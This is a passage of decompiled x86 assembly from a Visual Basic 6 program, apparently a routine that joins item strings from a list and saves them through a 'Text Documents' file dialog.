008CFC26: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFC2B: push eax
008CFC2C: lea eax, var_000000BC
008CFC32: push eax
008CFC33: call 00410A84h ; Set (object)
008CFC38: push eax
008CFC39: lea eax, var_00000164
008CFC3F: push eax
008CFC40: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFC45: add esp, 00000020h
008CFC48: push eax
008CFC49: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFC4E: push eax
008CFC4F: lea eax, var_000000C0
008CFC55: push eax
008CFC56: call 00410A84h ; Set (object)
008CFC5B: push eax
008CFC5C: lea eax, var_00000174
008CFC62: push eax
008CFC63: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFC68: add esp, 00000020h
008CFC6B: push eax
008CFC6C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFC71: mov edx, eax
008CFC73: lea ecx, var_74
008CFC76: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFC7B: push eax
008CFC7C: call 00410A18h ; &
008CFC81: mov edx, eax
008CFC83: lea ecx, var_78
008CFC86: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFC8B: push eax
008CFC8C: push 00445568h
008CFC91: call 00410A18h ; &
008CFC96: mov edx, eax
008CFC98: lea ecx, var_7C
008CFC9B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFCA0: push eax
008CFCA1: push 00000010h
008CFCA3: pop eax
008CFCA4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFCA9: lea esi, var_00000294
008CFCAF: mov edi, esp
008CFCB1: movsd 
008CFCB2: movsd 
008CFCB3: movsd 
008CFCB4: movsd 
008CFCB5: push 00000001h
008CFCB7: push 00000010h
008CFCB9: push 00440E58h
008CFCBE: push 00000010h
008CFCC0: pop eax
008CFCC1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFCC6: lea esi, var_00000284
008CFCCC: mov edi, esp
008CFCCE: movsd 
008CFCCF: movsd 
008CFCD0: movsd 
008CFCD1: movsd 
008CFCD2: push 00000001h
008CFCD4: push 00000000h
008CFCD6: push 00440E48h
008CFCDB: push 00000000h
008CFCDD: push 00000018h
008CFCDF: mov eax, [ebp+08h]
008CFCE2: mov eax, [eax]
008CFCE4: push [ebp+08h]
008CFCE7: call [eax+00000314h]
008CFCED: push eax
008CFCEE: lea eax, var_000000C4
008CFCF4: push eax
008CFCF5: call 00410A84h ; Set (object)
008CFCFA: push eax
008CFCFB: lea eax, var_00000184
008CFD01: push eax
008CFD02: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFD07: add esp, 00000010h
008CFD0A: push eax
008CFD0B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFD10: push eax
008CFD11: lea eax, var_000000C8
008CFD17: push eax
008CFD18: call 00410A84h ; Set (object)
008CFD1D: push eax
008CFD1E: lea eax, var_00000194
008CFD24: push eax
008CFD25: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFD2A: add esp, 00000020h
008CFD2D: push eax
008CFD2E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFD33: push eax
008CFD34: lea eax, var_000000CC
008CFD3A: push eax
008CFD3B: call 00410A84h ; Set (object)
008CFD40: push eax
008CFD41: lea eax, var_000001A4
008CFD47: push eax
008CFD48: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFD4D: add esp, 00000020h
008CFD50: push eax
008CFD51: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFD56: mov edx, eax
008CFD58: lea ecx, var_80
008CFD5B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFD60: push eax
008CFD61: call 00410A18h ; &
008CFD66: mov edx, eax
008CFD68: lea ecx, var_00000084
008CFD6E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFD73: push eax
008CFD74: push 00445568h
008CFD79: call 00410A18h ; &
008CFD7E: mov edx, eax
008CFD80: lea ecx, var_00000088
008CFD86: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFD8B: push eax
008CFD8C: push 00000010h
008CFD8E: pop eax
008CFD8F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFD94: lea esi, var_000002C4
008CFD9A: mov edi, esp
008CFD9C: movsd 
008CFD9D: movsd 
008CFD9E: movsd 
008CFD9F: movsd 
008CFDA0: push 00000001h
008CFDA2: push 00000010h
008CFDA4: push 00440E58h
008CFDA9: push 00000010h
008CFDAB: pop eax
008CFDAC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFDB1: lea esi, var_000002B4
008CFDB7: mov edi, esp
008CFDB9: movsd 
008CFDBA: movsd 
008CFDBB: movsd 
008CFDBC: movsd 
008CFDBD: push 00000001h
008CFDBF: push 00000000h
008CFDC1: push 00440E48h
008CFDC6: push 00000000h
008CFDC8: push 00000018h
008CFDCA: mov eax, [ebp+08h]
008CFDCD: mov eax, [eax]
008CFDCF: push [ebp+08h]
008CFDD2: call [eax+00000314h]
008CFDD8: push eax
008CFDD9: lea eax, var_000000D0
008CFDDF: push eax
008CFDE0: call 00410A84h ; Set (object)
008CFDE5: push eax
008CFDE6: lea eax, var_000001B4
008CFDEC: push eax
008CFDED: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFDF2: add esp, 00000010h
008CFDF5: push eax
008CFDF6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFDFB: push eax
008CFDFC: lea eax, var_000000D4
008CFE02: push eax
008CFE03: call 00410A84h ; Set (object)
008CFE08: push eax
008CFE09: lea eax, var_000001C4
008CFE0F: push eax
008CFE10: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFE15: add esp, 00000020h
008CFE18: push eax
008CFE19: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFE1E: push eax
008CFE1F: lea eax, var_000000D8
008CFE25: push eax
008CFE26: call 00410A84h ; Set (object)
008CFE2B: push eax
008CFE2C: lea eax, var_000001D4
008CFE32: push eax
008CFE33: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFE38: add esp, 00000020h
008CFE3B: push eax
008CFE3C: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFE41: mov edx, eax
008CFE43: lea ecx, var_0000008C
008CFE49: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFE4E: push eax
008CFE4F: call 00410A18h ; &
008CFE54: mov edx, eax
008CFE56: lea ecx, var_00000090
008CFE5C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFE61: push eax
008CFE62: push 00445568h
008CFE67: call 00410A18h ; &
008CFE6C: mov edx, eax
008CFE6E: lea ecx, var_00000094
008CFE74: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFE79: push eax
008CFE7A: push 00000010h
008CFE7C: pop eax
008CFE7D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFE82: lea esi, var_000002F4
008CFE88: mov edi, esp
008CFE8A: movsd 
008CFE8B: movsd 
008CFE8C: movsd 
008CFE8D: movsd 
008CFE8E: push 00000001h
008CFE90: push 00000010h
008CFE92: push 00440E58h
008CFE97: push 00000010h
008CFE99: pop eax
008CFE9A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CFE9F: lea esi, var_000002E4
008CFEA5: mov edi, esp
008CFEA7: movsd 
008CFEA8: movsd 
008CFEA9: movsd 
008CFEAA: movsd 
008CFEAB: push 00000001h
008CFEAD: push 00000000h
008CFEAF: push 00440E48h
008CFEB4: push 00000000h
008CFEB6: push 00000018h
008CFEB8: mov eax, [ebp+08h]
008CFEBB: mov eax, [eax]
008CFEBD: push [ebp+08h]
008CFEC0: call [eax+00000314h]
008CFEC6: push eax
008CFEC7: lea eax, var_000000DC
008CFECD: push eax
008CFECE: call 00410A84h ; Set (object)
008CFED3: push eax
008CFED4: lea eax, var_000001E4
008CFEDA: push eax
008CFEDB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFEE0: add esp, 00000010h
008CFEE3: push eax
008CFEE4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFEE9: push eax
008CFEEA: lea eax, var_000000E0
008CFEF0: push eax
008CFEF1: call 00410A84h ; Set (object)
008CFEF6: push eax
008CFEF7: lea eax, var_000001F4
008CFEFD: push eax
008CFEFE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFF03: add esp, 00000020h
008CFF06: push eax
008CFF07: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CFF0C: push eax
008CFF0D: lea eax, var_000000E4
008CFF13: push eax
008CFF14: call 00410A84h ; Set (object)
008CFF19: push eax
008CFF1A: lea eax, var_00000204
008CFF20: push eax
008CFF21: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CFF26: add esp, 00000020h
008CFF29: push eax
008CFF2A: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CFF2F: mov edx, eax
008CFF31: lea ecx, var_00000098
008CFF37: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFF3C: push eax
008CFF3D: call 00410A18h ; &
008CFF42: mov edx, eax
008CFF44: lea ecx, var_0000009C
008CFF4A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFF4F: push eax
008CFF50: push 00441264h ; vbCrLf
008CFF55: call 00410A18h ; &
008CFF5A: mov edx, eax
008CFF5C: lea ecx, var_44
008CFF5F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CFF64: lea eax, var_0000009C
008CFF6A: push eax
008CFF6B: lea eax, var_00000098
008CFF71: push eax
008CFF72: lea eax, var_00000094
008CFF78: push eax
008CFF79: lea eax, var_00000090
008CFF7F: push eax
008CFF80: lea eax, var_0000008C
008CFF86: push eax
008CFF87: lea eax, var_00000088
008CFF8D: push eax
008CFF8E: lea eax, var_00000084
008CFF94: push eax
008CFF95: lea eax, var_80
008CFF98: push eax
008CFF99: lea eax, var_7C
008CFF9C: push eax
008CFF9D: lea eax, var_78
008CFFA0: push eax
008CFFA1: lea eax, var_74
008CFFA4: push eax
008CFFA5: lea eax, var_70
008CFFA8: push eax
008CFFA9: lea eax, var_6C
008CFFAC: push eax
008CFFAD: lea eax, var_68
008CFFB0: push eax
008CFFB1: lea eax, var_64
008CFFB4: push eax
008CFFB5: lea eax, var_60
008CFFB8: push eax
008CFFB9: lea eax, var_5C
008CFFBC: push eax
008CFFBD: push 00000011h
008CFFBF: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CFFC4: add esp, 00000048h
008CFFC7: lea eax, var_000000E4
008CFFCD: push eax
008CFFCE: lea eax, var_000000E0
008CFFD4: push eax
008CFFD5: lea eax, var_000000DC
008CFFDB: push eax
008CFFDC: lea eax, var_000000D8
008CFFE2: push eax
008CFFE3: lea eax, var_000000D4
008CFFE9: push eax
008CFFEA: lea eax, var_000000D0
008CFFF0: push eax
008CFFF1: lea eax, var_000000CC
008CFFF7: push eax
008CFFF8: lea eax, var_000000C8
008CFFFE: push eax
008CFFFF: lea eax, var_000000C4
008D0005: push eax
008D0006: lea eax, var_000000C0
008D000C: push eax
008D000D: lea eax, var_000000BC
008D0013: push eax
008D0014: lea eax, var_000000B8
008D001A: push eax
008D001B: lea eax, var_000000B4
008D0021: push eax
008D0022: lea eax, var_000000B0
008D0028: push eax
008D0029: lea eax, var_000000AC
008D002F: push eax
008D0030: lea eax, var_000000A8
008D0036: push eax
008D0037: lea eax, var_000000A4
008D003D: push eax
008D003E: lea eax, var_000000A0
008D0044: push eax
008D0045: push 00000012h
008D0047: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D004C: add esp, 0000004Ch
008D004F: lea eax, var_00000204
008D0055: push eax
008D0056: lea eax, var_000001F4
008D005C: push eax
008D005D: lea eax, var_000001E4
008D0063: push eax
008D0064: lea eax, var_000001D4
008D006A: push eax
008D006B: lea eax, var_000001C4
008D0071: push eax
008D0072: lea eax, var_000001B4
008D0078: push eax
008D0079: lea eax, var_000001A4
008D007F: push eax
008D0080: lea eax, var_00000194
008D0086: push eax
008D0087: lea eax, var_00000184
008D008D: push eax
008D008E: lea eax, var_00000174
008D0094: push eax
008D0095: lea eax, var_00000164
008D009B: push eax
008D009C: lea eax, var_00000154
008D00A2: push eax
008D00A3: lea eax, var_00000144
008D00A9: push eax
008D00AA: lea eax, var_00000134
008D00B0: push eax
008D00B1: lea eax, var_00000124
008D00B7: push eax
008D00B8: lea eax, var_00000114
008D00BE: push eax
008D00BF: lea eax, var_00000104
008D00C5: push eax
008D00C6: lea eax, var_000000F4
008D00CC: push eax
008D00CD: push 00000012h
008D00CF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D00D4: add esp, 0000004Ch
008D00D7: mov var_04, 00000009h
008D00DE: lea eax, var_00000334
008D00E4: push eax
008D00E5: lea eax, var_00000324
008D00EB: push eax
008D00EC: lea eax, var_30
008D00EF: push eax
008D00F0: call 00410A36h ; Next
008D00F5: mov var_00000370, eax
008D00FB: cmp var_00000370, 00000000h
008D0102: jnz 008CF80Bh
008D0108: mov var_04, 0000000Ah
008D010F: cmp [008F529Ch], 00000000h
008D0116: jnz 8D0133h
008D0118: push 008F529Ch
008D011D: push 00440F2Ch
008D0122: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D0127: mov var_0000037C, 008F529Ch
008D0131: jmp 8D013Dh
008D0133: mov var_0000037C, 008F529Ch
008D013D: mov eax, var_0000037C
008D0143: mov eax, [eax]
008D0145: mov var_00000308, eax
008D014B: lea eax, var_000000A0
008D0151: push eax
008D0152: mov eax, var_00000308
008D0158: mov eax, [eax]
008D015A: push var_00000308
008D0160: call [eax+1Ch]
008D0163: fclex 
008D0165: mov var_0000030C, eax
008D016B: cmp var_0000030C, 00000000h
008D0172: jnl 8D0194h
008D0174: push 0000001Ch
008D0176: push 00440F1Ch
008D017B: push var_00000308
008D0181: push var_0000030C
008D0187: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D018C: mov var_00000380, eax
008D0192: jmp 8D019Bh
008D0194: and var_00000380, 00000000h
008D019B: mov eax, var_000000A0
008D01A1: mov var_00000310, eax
008D01A7: mov eax, var_00000310
008D01AD: mov eax, [eax]
008D01AF: push var_00000310
008D01B5: call [eax+50h]
008D01B8: fclex 
008D01BA: mov var_00000314, eax
008D01C0: cmp var_00000314, 00000000h
008D01C7: jnl 8D01E9h
008D01C9: push 00000050h
008D01CB: push 00445554h
008D01D0: push var_00000310
008D01D6: push var_00000314
008D01DC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D01E1: mov var_00000384, eax
008D01E7: jmp 8D01F0h
008D01E9: and var_00000384, 00000000h
008D01F0: lea ecx, var_000000A0
008D01F6: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D01FB: mov var_04, 0000000Bh
008D0202: cmp [008F529Ch], 00000000h
008D0209: jnz 8D0226h
008D020B: push 008F529Ch
008D0210: push 00440F2Ch
008D0215: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D021A: mov var_00000388, 008F529Ch
008D0224: jmp 8D0230h
008D0226: mov var_00000388, 008F529Ch
008D0230: mov eax, var_00000388
008D0236: mov eax, [eax]
008D0238: mov var_00000308, eax
008D023E: lea eax, var_000000A0
008D0244: push eax
008D0245: mov eax, var_00000308
008D024B: mov eax, [eax]
008D024D: push var_00000308
008D0253: call [eax+1Ch]
008D0256: fclex 
008D0258: mov var_0000030C, eax
008D025E: cmp var_0000030C, 00000000h
008D0265: jnl 8D0287h
008D0267: push 0000001Ch
008D0269: push 00440F1Ch
008D026E: push var_00000308
008D0274: push var_0000030C
008D027A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D027F: mov var_0000038C, eax
008D0285: jmp 8D028Eh
008D0287: and var_0000038C, 00000000h
008D028E: mov eax, var_000000A0
008D0294: mov var_00000310, eax
008D029A: mov var_0000020C, 80020004h
008D02A4: mov var_00000214, 0000000Ah
008D02AE: push 00000010h
008D02B0: pop eax
008D02B1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D02B6: lea esi, var_00000214
008D02BC: mov edi, esp
008D02BE: movsd 
008D02BF: movsd 
008D02C0: movsd 
008D02C1: movsd 
008D02C2: push var_44
008D02C5: mov eax, var_00000310
008D02CB: mov eax, [eax]
008D02CD: push var_00000310
008D02D3: call [eax+60h]
008D02D6: fclex 
008D02D8: mov var_00000314, eax
008D02DE: cmp var_00000314, 00000000h
008D02E5: jnl 8D0307h
008D02E7: push 00000060h
008D02E9: push 00445554h
008D02EE: push var_00000310
008D02F4: push var_00000314
008D02FA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D02FF: mov var_00000390, eax
008D0305: jmp 8D030Eh
008D0307: and var_00000390, 00000000h
008D030E: lea ecx, var_000000A0
008D0314: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D0319: jmp 008D0EA9h
008D031E: mov var_04, 0000000Dh
008D0325: cmp [008F529Ch], 00000000h
008D032C: jnz 8D0349h
008D032E: push 008F529Ch
008D0333: push 00440F2Ch
008D0338: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D033D: mov var_00000394, 008F529Ch
008D0347: jmp 8D0353h
008D0349: mov var_00000394, 008F529Ch
008D0353: mov eax, var_00000394
008D0359: mov eax, [eax]
008D035B: mov var_00000308, eax
008D0361: lea eax, var_000000A0
008D0367: push eax
008D0368: mov eax, var_00000308
008D036E: mov eax, [eax]
008D0370: push var_00000308
008D0376: call [eax+14h]
008D0379: fclex 
008D037B: mov var_0000030C, eax
008D0381: cmp var_0000030C, 00000000h
008D0388: jnl 8D03AAh
008D038A: push 00000014h
008D038C: push 00440F1Ch
008D0391: push var_00000308
008D0397: push var_0000030C
008D039D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D03A2: mov var_00000398, eax
008D03A8: jmp 8D03B1h
008D03AA: and var_00000398, 00000000h
008D03B1: mov eax, var_000000A0
008D03B7: mov var_00000310, eax
008D03BD: lea eax, var_5C
008D03C0: push eax
008D03C1: mov eax, var_00000310
008D03C7: mov eax, [eax]
008D03C9: push var_00000310
008D03CF: call [eax+50h]
008D03D2: fclex 
008D03D4: mov var_00000314, eax
008D03DA: cmp var_00000314, 00000000h
008D03E1: jnl 8D0403h
008D03E3: push 00000050h
008D03E5: push 00440F3Ch
008D03EA: push var_00000310
008D03F0: push var_00000314
008D03F6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D03FB: mov var_0000039C, eax
008D0401: jmp 8D040Ah
008D0403: and var_0000039C, 00000000h
008D040A: push 00000000h
008D040C: push 00000000h
008D040E: push var_5C
008D0411: push 0044558Ch ; txt
008D0416: push 00452FD0h ; Text Documents
008D041B: call 007CCC4Dh
008D0420: mov var_000000EC, eax
008D0426: mov var_000000F4, 00000008h
008D0430: lea edx, var_000000F4
008D0436: lea ecx, var_58
008D0439: call 00410922h ; msvbvm60.dll.__vbaVarMove
008D043E: lea ecx, var_5C
008D0441: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008D0446: lea ecx, var_000000A0
008D044C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D0451: mov var_04, 0000000Eh
008D0458: and var_0000020C, 00000000h
008D045F: mov var_00000214, 00008008h
008D0469: lea eax, var_58
008D046C: push eax
008D046D: lea eax, var_00000214
008D0473: push eax
008D0474: call 00410868h ; msvbvm60.dll.__vbaVarTstNe
008D0479: movsx eax, ax
008D047C: test eax, eax
008D047E: jz 008D0E29h
008D0484: mov var_04, 0000000Fh
008D048B: mov var_0000020C, 00000001h
008D0495: mov var_00000214, 00000002h
008D049F: push 00000000h
008D04A1: push 00000001h
008D04A3: push 00440E48h
008D04A8: push 00000000h
008D04AA: push 00000018h
008D04AC: mov eax, [ebp+08h]
008D04AF: mov eax, [eax]
008D04B1: push [ebp+08h]
008D04B4: call [eax+00000314h]
008D04BA: push eax
008D04BB: lea eax, var_000000A0
008D04C1: push eax
008D04C2: call 00410A84h ; Set (object)
008D04C7: push eax
008D04C8: lea eax, var_000000F4
008D04CE: push eax
008D04CF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D04D4: add esp, 00000010h
008D04D7: push eax
008D04D8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D04DD: push eax
008D04DE: lea eax, var_000000A4
008D04E4: push eax
008D04E5: call 00410A84h ; Set (object)
008D04EA: push eax
008D04EB: lea eax, var_00000104
008D04F1: push eax
008D04F2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D04F7: add esp, 00000010h
008D04FA: push eax
008D04FB: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D0500: mov var_0000021C, eax
008D0506: mov var_00000224, 00000003h
008D0510: mov var_0000022C, 00000001h
008D051A: mov var_00000234, 00000002h
008D0524: lea eax, var_00000214
008D052A: push eax
008D052B: lea eax, var_00000224
008D0531: push eax
008D0532: lea eax, var_00000234
008D0538: push eax
008D0539: lea eax, var_00000354
008D053F: push eax
008D0540: lea eax, var_00000344
008D0546: push eax
008D0547: lea eax, var_30
008D054A: push eax
008D054B: call 00410A3Ch ; For
008D0550: mov var_00000374, eax
008D0556: lea eax, var_000000A4
008D055C: push eax
008D055D: lea eax, var_000000A0
008D0563: push eax
008D0564: push 00000002h
008D0566: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D056B: add esp, 0000000Ch
008D056E: lea eax, var_00000104
008D0574: push eax
008D0575: lea eax, var_000000F4
008D057B: push eax
008D057C: push 00000002h
008D057E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D0583: add esp, 0000000Ch
008D0586: jmp 008D0D60h
008D058B: mov var_04, 00000010h
008D0592: lea eax, var_30
008D0595: mov var_0000020C, eax
008D059B: mov var_00000214, 0000400Ch
008D05A5: mov var_0000022C, 00000001h
008D05AF: mov var_00000234, 00000003h
008D05B9: lea eax, var_30
008D05BC: mov var_0000021C, eax
008D05C2: mov var_00000224, 0000400Ch
008D05CC: mov var_0000025C, 00000002h
008D05D6: mov var_00000264, 00000003h
008D05E0: lea eax, var_30
008D05E3: mov var_0000024C, eax
008D05E9: mov var_00000254, 0000400Ch
008D05F3: mov var_0000028C, 00000003h
008D05FD: mov var_00000294, 00000003h
008D0607: lea eax, var_30
008D060A: mov var_0000027C, eax
008D0610: mov var_00000284, 0000400Ch
008D061A: mov var_000002BC, 00000004h
008D0624: mov var_000002C4, 00000003h
008D062E: lea eax, var_30
008D0631: mov var_000002AC, eax
008D0637: mov var_000002B4, 0000400Ch
008D0641: mov var_000002EC, 00000005h
008D064B: mov var_000002F4, 00000003h
008D0655: lea eax, var_30
008D0658: mov var_000002DC, eax
008D065E: mov var_000002E4, 0000400Ch
008D0668: push var_44
008D066B: push 00000000h
008D066D: push 00000000h
008D066F: push 00440E58h
008D0674: push 00000010h
008D0676: pop eax
008D0677: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D067C: lea esi, var_00000214
008D0682: mov edi, esp
008D0684: movsd 
008D0685: movsd 
008D0686: movsd 
008D0687: movsd 
008D0688: push 00000001h
008D068A: push 00000000h
008D068C: push 00440E48h
008D0691: push 00000000h
008D0693: push 00000018h
008D0695: mov eax, [ebp+08h]
008D0698: mov eax, [eax]
008D069A: push [ebp+08h]
008D069D: call [eax+00000314h]
008D06A3: push eax
008D06A4: lea eax, var_000000A0
008D06AA: push eax
008D06AB: call 00410A84h ; Set (object)
008D06B0: push eax
008D06B1: lea eax, var_000000F4
008D06B7: push eax
008D06B8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D06BD: add esp, 00000010h
008D06C0: push eax
008D06C1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D06C6: push eax
008D06C7: lea eax, var_000000A4
008D06CD: push eax
008D06CE: call 00410A84h ; Set (object)
008D06D3: push eax
008D06D4: lea eax, var_00000104
008D06DA: push eax
008D06DB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D06E0: add esp, 00000020h
008D06E3: push eax
008D06E4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D06E9: push eax
008D06EA: lea eax, var_000000A8
008D06F0: push eax
008D06F1: call 00410A84h ; Set (object)
008D06F6: push eax
008D06F7: lea eax, var_00000114
008D06FD: push eax
008D06FE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0703: add esp, 00000010h
008D0706: push eax
008D0707: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D070C: mov edx, eax
008D070E: lea ecx, var_5C
008D0711: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0716: push eax
008D0717: call 00410A18h ; &
008D071C: mov edx, eax
008D071E: lea ecx, var_60
008D0721: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0726: push eax
008D0727: push 00445568h
008D072C: call 00410A18h ; &
008D0731: mov edx, eax
008D0733: lea ecx, var_64
008D0736: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D073B: push eax
008D073C: push 00000010h
008D073E: pop eax
008D073F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0744: lea esi, var_00000234
008D074A: mov edi, esp
008D074C: movsd 
008D074D: movsd 
008D074E: movsd 
008D074F: movsd 
008D0750: push 00000001h
008D0752: push 00000010h
008D0754: push 00440E58h
008D0759: push 00000010h
008D075B: pop eax
008D075C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0761: lea esi, var_00000224
008D0767: mov edi, esp
008D0769: movsd 
008D076A: movsd 
008D076B: movsd 
008D076C: movsd 
008D076D: push 00000001h
008D076F: push 00000000h
008D0771: push 00440E48h
008D0776: push 00000000h
008D0778: push 00000018h
008D077A: mov eax, [ebp+08h]
008D077D: mov eax, [eax]
008D077F: push [ebp+08h]
008D0782: call [eax+00000314h]
008D0788: push eax
008D0789: lea eax, var_000000AC
008D078F: push eax
008D0790: call 00410A84h ; Set (object)
008D0795: push eax
008D0796: lea eax, var_00000124
008D079C: push eax
008D079D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D07A2: add esp, 00000010h
008D07A5: push eax
008D07A6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D07AB: push eax
008D07AC: lea eax, var_000000B0
008D07B2: push eax
008D07B3: call 00410A84h ; Set (object)
008D07B8: push eax
008D07B9: lea eax, var_00000134
008D07BF: push eax
008D07C0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D07C5: add esp, 00000020h
008D07C8: push eax
008D07C9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D07CE: push eax
008D07CF: lea eax, var_000000B4
008D07D5: push eax
008D07D6: call 00410A84h ; Set (object)
008D07DB: push eax
008D07DC: lea eax, var_00000144
008D07E2: push eax
008D07E3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D07E8: add esp, 00000020h
008D07EB: push eax
008D07EC: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D07F1: mov edx, eax
008D07F3: lea ecx, var_68
008D07F6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D07FB: push eax
008D07FC: call 00410A18h ; &
008D0801: mov edx, eax
008D0803: lea ecx, var_6C
008D0806: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D080B: push eax
008D080C: push 00445568h
008D0811: call 00410A18h ; &
008D0816: mov edx, eax
008D0818: lea ecx, var_70
008D081B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0820: push eax
008D0821: push 00000010h
008D0823: pop eax
008D0824: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0829: lea esi, var_00000264
008D082F: mov edi, esp
008D0831: movsd 
008D0832: movsd 
008D0833: movsd 
008D0834: movsd 
008D0835: push 00000001h
008D0837: push 00000010h
008D0839: push 00440E58h
008D083E: push 00000010h
008D0840: pop eax
008D0841: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0846: lea esi, var_00000254
008D084C: mov edi, esp
008D084E: movsd 
008D084F: movsd 
008D0850: movsd 
008D0851: movsd 
008D0852: push 00000001h
008D0854: push 00000000h
008D0856: push 00440E48h
008D085B: push 00000000h
008D085D: push 00000018h
008D085F: mov eax, [ebp+08h]
008D0862: mov eax, [eax]
008D0864: push [ebp+08h]
008D0867: call [eax+00000314h]
008D086D: push eax
008D086E: lea eax, var_000000B8
008D0874: push eax
008D0875: call 00410A84h ; Set (object)
008D087A: push eax
008D087B: lea eax, var_00000154
008D0881: push eax
008D0882: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0887: add esp, 00000010h
008D088A: push eax
008D088B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0890: push eax
008D0891: lea eax, var_000000BC
008D0897: push eax
008D0898: call 00410A84h ; Set (object)
008D089D: push eax
008D089E: lea eax, var_00000164
008D08A4: push eax
008D08A5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D08AA: add esp, 00000020h
008D08AD: push eax
008D08AE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D08B3: push eax
008D08B4: lea eax, var_000000C0
008D08BA: push eax
008D08BB: call 00410A84h ; Set (object)
008D08C0: push eax
008D08C1: lea eax, var_00000174
008D08C7: push eax
008D08C8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D08CD: add esp, 00000020h
008D08D0: push eax
008D08D1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D08D6: mov edx, eax
008D08D8: lea ecx, var_74
008D08DB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D08E0: push eax
